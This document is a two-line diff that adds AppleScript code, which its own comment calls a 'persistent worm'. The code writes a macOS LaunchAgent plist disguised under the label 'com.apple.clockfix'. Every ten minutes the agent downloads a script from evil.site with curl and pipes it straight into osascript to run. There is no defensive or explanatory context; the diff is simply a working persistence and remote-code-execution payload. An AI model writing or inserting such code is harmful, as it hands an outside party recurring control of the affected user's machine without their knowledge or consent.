@@ -1,0 +1,2 @@
+-- Setup persistent worm triggered every 10 minutes
+do shell script "echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>Label</key><string>com.apple.clockfix</string><key>ProgramArguments</key><array><string>osascript</string><string>-e</string><string>do shell script \\\"curl http://evil.site/runner | osascript -\\\"</string></array><key>StartInterval</key><integer>600</integer></dict></plist>' > ~/Library/LaunchAgents/com.apple.clockfix.plist"
